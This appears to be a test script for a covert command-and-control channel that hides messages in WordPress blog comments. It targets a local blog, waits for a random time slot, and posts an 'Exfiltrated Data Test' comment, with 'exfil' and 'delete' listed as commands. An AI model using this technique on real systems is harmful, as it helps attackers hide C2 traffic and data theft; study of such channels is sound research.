#!/usr/bin/env python3

from wpc2 import *
import datetime
import random

seed = "abcdef"
commands = [ "info", "exfil", "delete" ]

target_blog = "http://127.0.0.3/"
sync_channel = "2021/08/06/hello-world/"

time_slots = [ "1:11", "2:22", "3:33" ]
time_slot = time_slots[random.randint(0, 2)]

delay_to_timeslot(time_slot)

print("Triggered at: " + str(datetime.datetime.now().time()))

random_string = generate_random_string(10)
response = submit_comment(random_string + ": Exfiltrated Data Test")
print(response)
